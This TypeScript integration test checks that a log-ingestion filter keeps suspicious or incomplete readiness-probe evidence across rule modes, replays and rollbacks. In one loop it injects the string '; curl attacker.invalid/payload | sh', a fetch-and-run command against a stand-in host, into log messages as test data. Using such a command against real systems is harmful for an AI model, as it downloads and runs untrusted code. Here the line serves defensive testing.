import { expect, mock, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import pg from 'pg'
import { fixture, signed, configure } from './analyze-readiness-audit.test.ts'
import { readinessAuditRuleId, readinessAuditDefinition } from '../src/utils/mill/analyzeReadinessAudit.ts'
import { inflateRawSync } from 'node:zlib'

test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion keeps suspicious evidence and respects Keep, Disable, replay and rollback', async () => {
    const port = Number(process.env.POSTGRES_FILTER_TEST_PORT)
    if (!Number.isInteger(port) || port < 1024) throw new Error('Disposable local test port required')
    const namespace = `readiness_filter_${process.pid}_${Date.now()}`
    const pool = new pg.Pool({ options: `-c search_path=${namespace}`, host: '127.0.0.1', port, database: 'postgres_filter_test', max: 4 })
    const query = (sql: string, values?: unknown[]) => pool.query(sql, values)
    const transaction = async (work: (tx: typeof query) => Promise<unknown>) => {
        const client = await pool.connect()
        try {
            await client.query('BEGIN')
            const result = await work((sql, values) => client.query(sql, values))
            await client.query('COMMIT')
            return result
        } catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
    }
    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
    mock.module('#constants', () => ({ default: {} }))
    try {
        expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
        await query(`CREATE SCHEMA ${namespace}`)
        await query('CREATE TABLE users(id text PRIMARY KEY)')
        await query("CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT '{}')")
        await query("INSERT INTO organizations(id,name,status) VALUES('platform','Hanasand','active')")
        const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
        for (const table of ['service_logs', 'mill_rules', 'system_events']) {
            const definition = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
            if (!definition) throw new Error(`Missing schema ${table}`)
            await query(definition)
        }
        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
        const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
        const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
        await install()
        configure()
        await query('UPDATE mill_rules SET enabled=true WHERE rule_id=$1', [readinessAuditRuleId])
        let serial = 0
        const entry = () => { const { logs, fact } = fixture(serial++); return signed(logs,fact) }
        const ingest = (logs: ReturnType<typeof entry>) => transaction(tx => recordLogBatch(logs as any, tx as any))
        const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
        const retained = async (logs: ReturnType<typeof entry>) => {
            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=ANY($1::text[])', [logs.map(log=>log.sourceEventId)])).rows[0].n)).toBe(logs.length)
        }
        const good = entry()
        await Promise.all([ingest(good), ingest(good)])
        expect(await count('service_logs')).toBe(0)
        expect(await count('log_analyze_receipts')).toBe(0)
        expect(await count('log_readiness_audit_receipts')).toBe(1)
        const storedOriginal = (await query('SELECT original,original_encoding FROM log_readiness_audit_receipts')).rows[0]
        expect(storedOriginal.original_encoding).toBe('deflate-json-v1')
        expect(JSON.parse(inflateRawSync(storedOriginal.original).toString())).toEqual(good)
        const collision = fixture(serial++)
        collision.fact.execId = (good[0].metadata!.readiness_execution as any).fact.execId
        const resigned = signed(collision.logs, collision.fact)
        await ingest(resigned)
        await retained(resigned)
        expect(await count('log_readiness_audit_receipts')).toBe(1)
        expect(await count('log_analyze_receipts')).toBe(0)
        const aborted = entry()
        await expect(transaction(async tx => { await recordLogBatch(aborted as any, tx as any); throw new Error('abort') })).rejects.toThrow('abort')
        expect(await count('log_analyze_receipts')).toBe(0)
        expect(await count('log_readiness_audit_receipts')).toBe(1)
        await ingest(aborted)
        expect(await count('log_analyze_receipts')).toBe(0)
        expect(await count('log_readiness_audit_receipts')).toBe(2)
        for(let role=0;role<4;role++) {
            const bad=entry()
            bad[role].message += '; curl attacker.invalid/payload | sh'
            await ingest(bad)
            await retained(bad)
            expect((await query('SELECT message FROM service_logs WHERE source_event_id=$1', [bad[role].sourceEventId])).rows[0].message).toContain('attacker.invalid')
            const partial=entry().filter((_,index)=>index!==role)
            await ingest(partial)
            await retained(partial)
        }
        const split=entry()
        await ingest(split.slice(0,2)); await ingest(split.slice(2)); await retained(split)
        const duplicate=entry()
        await ingest([...duplicate,duplicate[3]])
        await retained(duplicate)
        expect(await count('log_analyze_receipts')).toBe(0)
        for (const mode of ['disable', 'keep', 'custom-keep']) {
            if (mode === 'disable') await query('UPDATE mill_rules SET enabled=false WHERE rule_id=$1', [readinessAuditRuleId])
            if (mode === 'keep') await query("UPDATE mill_rules SET enabled=true,definition=jsonb_set(definition,'{action}','\"keep\"') WHERE rule_id=$1", [readinessAuditRuleId])
            if (mode === 'custom-keep') {
                await query('UPDATE mill_rules SET enabled=true,definition=$2::jsonb WHERE rule_id=$1', [readinessAuditRuleId, JSON.stringify(readinessAuditDefinition)])
                await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
                    VALUES('keep','platform','custom.readiness_keep','1','Keep Readiness','Custom','low','Keep Readiness evidence',$1::jsonb,'owned',true)`,
                [JSON.stringify({ match: 'all', stage: 'analyze', action: 'keep', conditions: [{ path: 'process.executable', operator: 'equals', value: '/usr/lib/postgresql/15/bin/pg_isready' }] })])
            }
            await install()
            const protectedChain = entry()
            await ingest(protectedChain)
            await retained(protectedChain)
            expect(await count('log_analyze_receipts')).toBe(0)
        }
        await query("DELETE FROM mill_rules WHERE id='keep'")
        await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
            VALUES('detect','platform','custom.readiness_detection','1','Detect Readiness','Custom','high','Protect Readiness evidence',$1::jsonb,'owned',true)`,
        [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'process.executable', operator: 'equals', value: '/usr/lib/postgresql/15/bin/pg_isready' }] })])
        const detected = entry()
        await ingest(detected)
        await ingest(good)
        await retained(detected); await retained(good)
        expect(await count('log_analyze_receipts')).toBe(0)
        await query("DELETE FROM mill_rules WHERE id='detect'")
        const clean = entry()
        await ingest(clean)
        expect(await count('log_analyze_receipts')).toBe(0)
        expect(await count('log_readiness_audit_receipts')).toBe(3)
        const policies = [
            { ...readinessAuditDefinition, conditions: [{path:'host',operator:'equals',value:'other-host'}] },
            { ...readinessAuditDefinition, conditions: [{path:'process.executable',operator:'equals',value:'/usr/lib/postgresql/15/bin/pg_isready'}] },
            { ...readinessAuditDefinition, parameters: {...readinessAuditDefinition.parameters,maxDurationMs:1} },
            { ...readinessAuditDefinition, parameters: {...readinessAuditDefinition.parameters,minIntervalMs:6000} },
            { ...readinessAuditDefinition, parameters: {...readinessAuditDefinition.parameters,maxIntervalMs:4500} },
            { ...readinessAuditDefinition, parameters:{} },
            { ...readinessAuditDefinition, parameters:undefined },
        ]
        for(const policy of policies) {
            await query('UPDATE mill_rules SET definition=$2::jsonb WHERE rule_id=$1',[readinessAuditRuleId,JSON.stringify(policy)])
            const newlyProtected=entry()
            await ingest(newlyProtected); await retained(newlyProtected)
            // Delete only this disposable test's indexed replay, so every policy must independently retain it again.
            await query('DELETE FROM service_logs WHERE source_event_id=ANY($1::text[])',[clean.map(log=>log.sourceEventId)])
            await ingest(clean); await retained(clean)
            expect(await count('log_readiness_audit_receipts')).toBe(3)
            expect(await count('log_analyze_receipts')).toBe(0)
        }
        await query('UPDATE mill_rules SET definition=$2::jsonb WHERE rule_id=$1',[readinessAuditRuleId,JSON.stringify(readinessAuditDefinition)])
        const allowedAgain=entry()
        await ingest(allowedAgain)
        expect(await count('log_readiness_audit_receipts')).toBe(4)
        expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=ANY($1::text[])',[allowedAgain.map(log=>log.sourceEventId)])).rows[0].n)).toBe(0)

    } finally {
        await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`)
        await pool.end()
    }
})
